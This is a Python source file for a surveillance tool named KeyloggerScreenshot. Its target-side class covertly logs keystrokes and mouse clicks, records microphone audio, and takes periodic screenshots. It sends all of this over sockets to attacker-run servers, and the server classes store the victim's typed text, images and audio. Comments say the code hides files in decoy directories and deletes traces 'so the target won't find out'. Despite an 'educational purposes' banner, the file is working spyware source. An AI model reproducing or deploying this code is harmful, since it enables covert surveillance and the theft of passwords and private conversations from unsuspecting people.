import PIL.Image
from pynput import keyboard
from pynput.mouse import Listener
import time
import sys
import socket
import pyautogui as pg
import os
import pyaudio
import wave
import threading
import ast
import BetterPrinting as bp
import random
import tkinter as tk


class KeyloggerTarget:
    def __init__(self, ip_of_server_photos, port_of_server_photos, ip_of_server_keylogger_data,
                 port_of_server_keylogger_data, ip_of_server_listener, port_of_server_listener, ip_of_timer,
                 port_of_timer, duration_in_seconds=200):
        global listening_time
        global ip_listener
        global port_listener
        # "duration_in_seconds" tells the programm how long it should last the default time is 200 seconds that's 3 Minutes and 20 Seconds
        self.ip_photos = ip_of_server_photos
        self.port_photos = port_of_server_photos
        self.ip_keylogger = ip_of_server_keylogger_data
        self.port_keylogger = port_of_server_keylogger_data
        self.ip_listener = ip_of_server_listener
        self.port_listener = port_of_server_listener
        self.duration = duration_in_seconds
        self.ip_timer = ip_of_timer
        self.port_timer = port_of_timer

        ip_listener = self.ip_listener
        port_listener = self.port_listener
        listening_time = self.duration
        self.check = []
        self.caps = False
        self.richtige_liste = None
        self.coordinates = None
        self.richtige_liste = []
        self.coordinates = []

    def daten_aufnehemen(self):
        listening_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listening_data.connect((ip_listener, port_listener))

        format = pyaudio.paInt16
        channels = 2
        rate = 44100
        chunk = 1024
        seconds = listening_time + 1

        audio = pyaudio.PyAudio()

        # start Recording
        stream = audio.open(format=format, channels=channels,
                            rate=rate, input=True,
                            frames_per_buffer=chunk)
        # print("recording...")
        frames = []

        for i in range(0, int(rate / chunk * seconds)):
            data = stream.read(chunk)
            frames.append(data)

        # print("finished recording")

        # stop Recording
        stream.stop_stream()
        stream.close()
        audio.terminate()

        # Connection with ServerListener

        str_frames = str(frames)
        listening_data.send(str_frames.encode())
        # Sends data to ServerListener

    def all_dir(self):
        global random_lst
        zeichen = "qwertzuiopasdfghjklyxcvbnm1234567890"
        random_lst = ["".join(random.sample(zeichen, random.randint(4, 10))) for x in range(100)]
        # This makes a list of every directory name randomly
        for dir_name in random_lst:
            os.system(f"mkdir {dir_name}")
            # The directory is being made here

        random_dir = random.choice(random_lst)
        os.chdir(random_dir)
        # We are now in that directory where the image can be stored

    def client(self, ip_photos, port_photos):
        global fhandle
        # fhandle is the variable which opens the foto
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip_photos, port_photos))
        # This connects to the server you specified
        image = pg.screenshot()
        # "image" screenshots the current image after a specific time
        fotoname = "Image.png"
        # Name of the image
        image.save(fotoname)
        # Saves the image in the current directory
        fhandle = open(fotoname, "rb")
        # Opens the image

        full_msg = b""
        # Every image information will be stored in "full_msg"
        for line in fhandle:
            full_msg += line

        s.send(full_msg)

    def countdown_send(self, zeit, ip_photos, port_photos, ip_keylogger, port_keylogger):
        seconds_list = [zahl for zahl in range(0, zeit + 1, 20) if zahl != 0]
        # The seconds the image will be sent in 20 steps to the server will be saved in "seconds_list"
        print(seconds_list)
        key_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            for x in range(zeit + 1):
                if x == 20:
                    self.all_dir()
                    # This function makes 100 files to store the image so the target won't find out
                print(x)
                zeit -= 1
                time.sleep(1)
                if x in seconds_list:
                    self.client(ip_photos, port_photos)
                    # The images will be sent
            key_data.connect((ip_keylogger, port_keylogger))
            # This is the ip and the port of the server the port shouldn't be the same the server_photos and the server_keylogger shouldn't be
            # in the same folder
            self.coordinates = list(set(self.coordinates))
            # This checks if the coordinates occur 2 times
            print(self.coordinates)
            wort = ""
            for zeichen in self.richtige_liste:
                wort += zeichen

            # Sends the data to server_keylogger
            all_data = str(self.coordinates) + wort
            # Coordinates and keydata are being concatenated
            key_data.send(all_data.encode())
            print(wort)
            print(self.richtige_liste)
            fhandle.close()
            # Closes the image
            os.remove("Image.png")
            # Deletes the image in the current directory
            os.chdir("..")
            # We have to go back so that we can delete the other directories
            for each_dir in random_lst:
                os.system(f"rmdir {each_dir}")
                # This deletes every directory
            sys.exit()
            # Stops the keylogger
        except KeyboardInterrupt:
            # If the target has destroyed the connection
            wort = "***%§§)§§%"
            # This is like a special code. To split it at the end
            for zeichen in self.richtige_liste:
                wort += zeichen
            data = f"THE CONNECTION HAS BEEN INTERRUPTED{wort}"
            # This let's the server know that the server should shut down
            key_data.connect((ip_keylogger, port_keylogger))
            key_data.send(data.encode())
            key_data.close()

            if os.path.exists("Image.png"):
                # It will destroy the image so target wound know anything
                fhandle.close()
                os.remove("Image.png")
            # This removes the image

    def kill_switch(self):
        # This function destroys the mouse info
        new_seconds = self.duration + 5
        # 20 seconds are being added because there might be a problem
        for x in range(new_seconds):
            time.sleep(1)
        # This stopes the
        sys.exit()

    def on_click(self, x, y, button, pressed):
        # This is the click function
        print(f"Target has pressed {x} and {y}")
        # All the coordinates will be stored in "self.coordinates"
        self.coordinates.append((x, y))

    def all_clicks(self):
        # This is just a function so it can be ran with threading
        with Listener(on_click=self.on_click) as listening:
            self.kill_switch()
            listening.join()

    def on_press(self, key):
        try:
            try:
                other_charecters = {"1": "!", "2": '"', "3": "§", "4": "$", "5": "%", "6": "&", "7": "/", "8": "(",
                                    "9": ")", "0": "=", "ß": "?"}
                if self.caps is True:
                    if key.char in other_charecters:
                        word = other_charecters[key.char]
                    else:
                        word = key.char.upper()
                else:
                    word = key.char

                print(f'Alphabetische Taste wurde gedrückt: {word} ')
                self.richtige_liste += word
                # Every pressed key will be saved in "richtige_liste" this is a german word and means "right_list"

                print(self.richtige_liste)
            except TypeError:
                pass

        except AttributeError:
            print(f'Eine andere Taste wurde gedrückt: {key}')
            if key == keyboard.Key.space or key == keyboard.Key.tab:
                self.richtige_liste += "{"
                # If the target presses tab or space a "{" will be appended to the list so the attacker knows when and
                # space or a tab key has been pressed
            elif key == keyboard.Key.caps_lock:
                self.caps = True
                self.check.append(1)
            check_caps = sum(self.check) / 2
            # If check_caps is not primary it will set self.caps to False

            if str(check_caps)[-1] != '0':
                pass
            else:
                self.caps = False

    def on_release(self, key):
        print(f'Key released: {key}')

    def start(self):
        if self.duration < 60:
            raise TypeError(f"{self.duration} is not greater and not equal to 60")
        # "duration_in_seconds" should always be bigger than 60 seconds
        else:
            listening_thread = threading.Thread(target=self.daten_aufnehemen)
            # This runs the programm behind the actual programming
            listening_thread.start()

            threading_mouse = threading.Thread(target=self.all_clicks)
            # This runs the programm behind the actual programming
            threading_mouse.start()

            send_timer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            send_timer.connect((self.ip_timer, self.port_timer))

            send_timer.send(str(self.duration).encode())
            # This sends the seconds to the server
            send_timer.close()

            with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
                self.countdown_send(self.duration, self.ip_photos, self.port_photos, self.ip_keylogger,
                                    self.port_keylogger)
                listener.join()
                # This listens to the keys that where typed


class ServerKeylogger:
    # This is the class of the Server. Both Server should not be in the same file
    def __init__(self, ip, port, simulater=False):
        self.ip = ip
        self.port = port
        self.simulater = simulater
        self.new_data = None

    def message(self, real_data):
        # To know if the server has some issues
        for zeichen in real_data:
            if "{" == zeichen:
                # "{" this detects if a space or a tab is in full_msg
                self.new_data = real_data.replace("{", " ")

        # The data is being stored in full_msg
        bp.color(f"Text of target: {self.new_data}", "magenta")
        zeit = time.strftime("%H-%M-%S-%Y")
        # This is the time the data has arrived
        if self.new_data != "":
            with open(f"Keylogger of the target Time {zeit}.txt", "a+", encoding="utf-8") as file:
                file.write(f"HERE IS EVERYTHING THE TARGET HAS TYPED \n\n{self.new_data}")

        else:
            bp.color("The Target didn't type something...", "magenta")

    def check_double(self):  # This function is here to check if there are more files with the same name
        dir = os.listdir()
        check = [each_name for each_name in dir if "mouseInfo" in each_name]
        if len(check) == 0:
            filename = "mouseInfoLog.txt"
        else:
            amount = len(check) + 1
            filename = f"mouseInfoLog {amount}.txt"

        return filename

    def countdown(self):
        global seconds
        global startbutton
        global tkWindow
        real_sec = seconds
        seconds = seconds + 4
        # Plus four seconds because of the time the code sleeps

        if sys.platform == "linux":
            size = "295x367"
        else:
            size = "250x415"

        tkWindow = tk.Tk()
        tkWindow.geometry(size)
        tkWindow.title('KeyloggerScreenshot')
        minutes = seconds // 60
        this_min = minutes * 60
        this_sec = seconds - this_min
        print(f"This simulation will last for {minutes} minutes and {this_sec} seconds\n")

        while seconds:  # Same like Timer Class
            mins, secs = divmod(seconds, 60)
            timer = '{:02d}:{:02d}'.format(mins, secs)
            print(f"\rTime left: {timer}", end="")
            time.sleep(1)
            seconds -= 1

        print("\nTHANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
        # GUI BY: DYMA020
        startbutton = tk.Button(tkWindow, text="Stop stimulation", command=self.changecol, height=10, width=30)
        # Puts everything on place
        startbutton.grid(row=1, column=0)
        if real_sec < 60:
            text = f"Simulation for {real_sec} seconds"
        else:
            m, s = divmod(real_sec, 60)
            timer = '{:02d}:{:02d}'.format(m, s)
            text = f"Simulation for {timer} minutes"
        # Just for decoration
        tk.Button(tkWindow, text=text, command=self.connection, height=10, width=30).grid(row=2, column=0)
        tkWindow.mainloop()

    def changecol(self):  # This function is here to if the simulation has ended
        startbutton.configure(bg="red")
        # This is the button
        startbutton["text"] = "Stop simulation"
        tkWindow.destroy()

    def connection(self):
        print("Successful connection")

    def start(self):
        global seconds
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((self.ip, self.port))
            server.listen(1000)

            bp.color("Waiting for connection....", "magenta")
            clientsocket, ipaddress = server.accept()
            # Data is in clientsocket and the ip-address is obviously in "ipaddress"
            bp.color(f"\nConnection has been established with {ipaddress}", "magenta")

            full_msg = ""
            while True:
                msg = clientsocket.recv(8192).decode()
                # More Data can be accepted due to a bigger buffer size
                if len(msg) <= 0: break
                full_msg += msg
            if ")]" in full_msg:
                # Checks if the coordinates are there
                cord = full_msg.split(")]")
                new_cor = cord[0] + ")]"
                direct = os.listdir()

                filename = self.check_double()
                with open(filename, "a+") as file:
                    # The coordinates will be stored in "mouseInfoLog.txt"
                    file.write(f"These are the coordinates of the target \n{new_cor}")
                bp.color("The coordinates of the target have been saved to your directory", "magenta")

                if cord[1] == "":
                    bp.color("The target hasn't typed anything", "magenta")
                else:
                    self.message(cord[1])

            elif "{" in full_msg and "THE CONNECTION HAS BEEN INTERRUPTED" not in full_msg:
                # This checks if the target hasn't clicked something and if there is still some data
                full_msg = full_msg.replace("[]", "")
                bp.color("The target hasn't clicked anything", "magenta")
                self.message(full_msg)

            elif "[]" == full_msg and "THE CONNECTION HAS BEEN INTERRUPTED" not in full_msg:
                # Checks if nothing has typed or clicked
                bp.color("The target hasn't typed and clicked anything", "magenta")

            else:
                print(full_msg)
                spalten = full_msg.split("***%§§)§§%")
                # This splits the data with the special code
                if spalten[1] != "":
                    # If the data is not empty
                    text = spalten[1]
                    for zeichen in text:
                        if "{" == zeichen:
                            text = text.replace("{", " ")
                    bp.color(f"Text of target: {text}", "magenta")
                    zeit = time.strftime("%H-%M-%S-%Y")
                    # This is the time the data has arrived
                    with open(f"Keylogger of the target Time {zeit}.txt", "a+", encoding="utf-8") as file:
                        file.write(f"HERE IS EVERYTHING THE TARGET HAS TYPED \n\n{text}")
                        # That means data will appear even if the connection isn't stabled
                else:
                    bp.color("The target hasn't written something in the meanwhile", "magenta")

                bp.color("\nTHE CONNECTION HAS BEEN INTERRUPTED", "magenta")
                bp.color("THE SERVER WILL BE DESTROYED\n", "magenta")
                os._exit(0)
                # This shuts down the server


            if self.simulater is True:
                print("Simulation will come in 10 seconds!!!")
                time.sleep(10)
                start = input("Do you want to start y/n?: ")
                if start not in ["y", "yes"]:
                    print("\nTHANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
                    sys.exit()

                mouse_coordinates = [mouse for mouse in os.listdir() if "mouseInfoLog" in mouse]
                # Looks for coordinates in mouseInfoLog

                if not mouse_coordinates:
                    # If there isn't a file called mouseInfoLog it will destroy itself
                    print("\nThe target hasn't clicked anything")
                    print("THANK YOU FOR YOU USING KEYLOGGERSCREENSHOT")
                    sys.exit()

                every_coordinate = []
                for each_core in mouse_coordinates:
                    fhandle = open(each_core)
                    for line in fhandle:
                        if "[" in line:
                            every_coordinate += ast.literal_eval(line)
                            # This makes a list out of a string

                img_files = [each_img for each_img in os.listdir() if "New_Image" in each_img]
                # This checks for all Images in the directory

                if not img_files:
                    print('There is no "New_Image" in this directory')
                    sys.exit()

                pg.FAILSAFE = False
                # This is for the corner allowance
                img_seconds = 5.572
                # This is the speed it takes to open the image
                speed = 0.47
                # This is the time each coordinate needs
                sleep = 1.5
                # This is the time where the code is taking a time out
                one_coordinate = speed + sleep

                duration_seconds = one_coordinate * len(every_coordinate)
                one_image = duration_seconds + img_seconds
                summed_up = one_image * len(img_files)
                seconds = round(summed_up)

                print(f"\nThe target has clicked {len(every_coordinate)} times on his screen")
                threading_count = threading.Thread(target=self.countdown)
                # The countdown will start
                threading_count.start()

                pg.sleep(4)
                for image in img_files:
                    im = PIL.Image.open(image)
                    # Opens the image
                    im.show()
                    time.sleep(2)
                    pg.press("f11")
                    # Makes the image in the perfect resolution
                    for x, y in every_coordinate:
                        pg.moveTo(x, y, 0.3)
                        time.sleep(sleep)
                    pg.press("esc")

        except OSError:
            raise OSError("Change the port number to run without an error")


class ServerPhotos:
    # This is the class of the Server. Both Server should not be in the same file
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def check_double(self):  # This function is here to check if there are more files with the same name
        dir = os.listdir()
        check = [each_name for each_name in dir if "New_Image" in each_name]
        if len(check) == 0: filename = "New_Image (1).png"
        else:
            amount = len(check) + 1
            filename = f"New_Image ({amount}).png"

        return filename

    def start(self):
        gui = """
    __ __              __                                 _____                                       __            __ 
   / //_/___   __  __ / /____   ____ _ ____ _ ___   _____/ ___/ _____ _____ ___   ___   ____   _____ / /_   ____   / /_
  / ,<  / _ \ / / / // // __ \ / __ `// __ `// _ \ / ___/\__ \ / ___// ___// _ \ / _ \ / __ \ / ___// __ \ / __ \ / __/
 / /| |/  __// /_/ // // /_/ // /_/ // /_/ //  __// /   ___/ // /__ / /   /  __//  __// / / /(__  )/ / / // /_/ // /_  
/_/ |_|\___/ \__, //_/ \____/ \__, / \__, / \___//_/   /____/ \___//_/    \___/ \___//_/ /_//____//_/ /_/ \____/ \__/  
            /____/           /____/ /____/    

                        ~Created by: Fawaz Bashiru~          
                        ~Write "python KLS_start.py -help" for help in the github version~   
                        REMINDER THIS WAS BUILD FOR EDUCATIONAL PURPOSES  
                        SO DON'T USE THIS FOR EVIL ACTIVITIES !!!!!                        
        """

        print(gui)
        bp.color("Cyan: ServerPhotos", "cyan")
        bp.color("Blue: ServerKeylogger", "magenta")
        bp.color("Green: ServerListener", "green")
        print("White: Timer\n")
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((self.ip, self.port))
            server.listen(1000)

            anzahl = 0
            while True:
                bp.color("Waiting for connection...", "cyan")
                client_socket, address = server.accept()
                bp.color(f"\n\nConnection has been established with {address}", "cyan")
                # Data is in client_socket and the address is obviously in "ipaddress"
                full_msg = b""
                # All the binary data is being stored in full_msg as in the previous classes
                while True:
                    msg = client_socket.recv(8192)
                    if len(msg) <= 0: break
                    full_msg += msg
                client_socket.close()
                anzahl += 1

                filename = self.check_double()
                with open(filename, "ab") as file:
                    # This stores the image
                    file.write(full_msg)

                # "anzahl" is for the amount of photos
                if anzahl > 1:
                    bp.color(f"{anzahl} Images has been saved to your working directory", "cyan")
                else:
                    bp.color(f"{anzahl} Image have been saved to your working directory", "cyan")
                # Detetcts how many Image have been saved to your directory


        except OSError:
            raise OSError("Change the port number to run without an error")


class ServerListener:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.filename = None

    def check_double(self):
        # This function checks if The Audio file is already in the directory
        dir = os.listdir()
        check = [each_name for each_name in dir if "Audio of Target" in each_name]
        if len(check) == 0:
            # If the directory has no file it will set the filename to default
            self.filename = "Audio of Target.wav"
        else:
            amount = len(check) + 1
            self.filename = f"Audio of Target {amount}.wav"
            # Filename will now be the amount of the audiofiles therer are directory

        return self.filename

    def start(self):
        try:
            listening_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listening_data.bind((self.ip, self.port))
            listening_data.listen(1000)
            # 5 possible connections
            bp.color("Waiting for connection...", "green")
            # Waits for a connection

            client_socket, ipaddress = listening_data.accept()
            bp.color(f"Connection has been established with {ipaddress}", "green")
            check = 0
            full_msg = ""
            while True:
                msg = client_socket.recv(30000000).decode()
                # The buffersize is 300000000 because there is a lot of data in audio files
                if len(msg) <= 0: break
                full_msg += msg

            listening_data.close()
            frames = ast.literal_eval(full_msg)
            filename = self.check_double()
            data_file = wave.open(filename, "wb")
            data_file.setnchannels(2)
            data_file.setsampwidth(2)
            data_file.setframerate(44100)
            data_file.writeframes(b''.join(frames))
            data_file.close()
            bp.color(f'"{filename}" has been saved to your directory', "green")

            # This stores everything the target was talking

        except OSError:
            pass


class Timer:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def countdown(self, seconds):
        minutes = seconds // 60
        # Calculates the floor
        false_second = minutes * 60
        exact_seconds = seconds - false_second

        print(f"The target is being connected. The IP of the target is coming....")
        while seconds:
            mins, secs = divmod(seconds, 60)
            timer = '{:02d}:{:02d}'.format(mins, secs)
            print(f"\rTime left: {timer}", end="")
            time.sleep(1)
            seconds -= 1

        if minutes == 0:
            print(f"\nSuccessful connection for {exact_seconds} seconds")
        elif exact_seconds == 0:
            print(f"\nSuccessful connection for {minutes} minutes")
        else:
            print(f"\nSuccessful connection for {minutes} minutes and {exact_seconds} seconds")

    def start_timer(self):
        show_time = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        show_time.bind((self.ip, self.port))
        show_time.listen(10)

        client_socket, ipaddress = show_time.accept()
        full_msg = ""
        while True:
            msg = client_socket.recv(10).decode()
            if len(msg) <= 0: break
            full_msg += msg

        seconds = int(full_msg)
        self.countdown(seconds)
